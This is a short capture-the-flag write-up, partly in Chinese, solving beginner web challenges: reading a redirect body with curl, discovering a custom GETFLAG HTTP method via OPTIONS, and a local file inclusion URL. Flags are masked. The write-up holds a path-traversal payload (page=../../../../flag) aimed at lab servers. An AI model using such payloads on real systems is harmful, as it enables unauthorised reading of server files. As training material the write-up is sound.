# web-3:Curl-1

step1:先用瀏覽器看看
```
==>被導向到http://120.114.62.89:2014/no_flag_is_here.php
```

step2:利用curl捕捉首頁
```
curl -v http://120.114.62.89:2014/
```
step3:仔細看看回傳的預設首頁==>找到關鍵index.php

step4:再次使用curl捕捉稍縱即逝的首頁
```
curl -v http://120.114.62.89:2014/index.php
```

```
*   Trying 120.114.62.89...
* Connected to 120.114.62.89 (120.114.62.89) port 2014 (#0)
> GET /index.php HTTP/1.1
> Host: 120.114.62.89:2014
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 302 Found
< Date: Sun, 20 May 2018 07:28:08 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Location: no_flag_is_here.php
< Content-Length: 34
< Content-Type: text/html
< 
BreakALLCTF{XXXXXXXXXXXXXXXXXXXXXXXXXXX}
* Connection #0 to host 120.114.62.89 left intact
```

# web-4:HTTP method 100

curl -X GET -v http://140.110.112.31:3001/index.php

curl -v http://140.110.112.31:3001/index.php
```
*   Trying 140.110.112.31...
* Connected to 140.110.112.31 (140.110.112.31) port 3001 (#0)
> GET /index.php HTTP/1.1
> Host: 140.110.112.31:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 501 Not Implemented
< Date: Sun, 20 May 2018 07:17:50 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Content-Length: 199
< Connection: close
< Content-Type: text/html
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>501 Not Implemented</title>
</head><body>
<h1>Not Implemented</h1>
<p>GET to /index.php not supported.<br />
</p>
* Closing connection 0
</body></html>
```

curl -X POST -v http://140.110.112.31:3001/index.php
```
*   Trying 140.110.112.31...
* Connected to 140.110.112.31 (140.110.112.31) port 3001 (#0)
> POST /index.php HTTP/1.1
> Host: 140.110.112.31:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 501 Not Implemented
< Date: Sun, 20 May 2018 07:18:07 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Content-Length: 200
< Connection: close
< Content-Type: text/html
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>501 Not Implemented</title>
</head><body>
<h1>Not Implemented</h1>
<p>POST to /index.php not supported.<br />
</p>
* Closing connection 0
```


curl -X OPTIONS  -v http://140.110.112.31:3001/index.php
```
*   Trying 140.110.112.31...
* Connected to 140.110.112.31 (140.110.112.31) port 3001 (#0)
> OPTIONS /index.php HTTP/1.1
> Host: 140.110.112.31:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sun, 20 May 2018 07:18:40 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Allow: GETFLAG,OPTIONS
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host 140.110.112.31 left intact

```
curl -X GETFLAG  -v http://140.110.112.31:3001/index.php

```
*   Trying 140.110.112.31...
* Connected to 140.110.112.31 (140.110.112.31) port 3001 (#0)
> GETFLAG /index.php HTTP/1.1
> Host: 140.110.112.31:3001
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Sun, 20 May 2018 07:19:34 GMT
< Server: Apache/2.4.7 (Ubuntu)
< X-Powered-By: PHP/5.5.9-1ubuntu4.22
< Content-Length: 33
< Content-Type: text/html
< 
* Connection #0 to host 140.110.112.31 left intact
BreakALLCTF{***********************}
```

# web-5:Local File Inclusion 80

http://140.110.112.31:2003/index.php?page=../../../../flag

# Web-6:Burp Suite 110


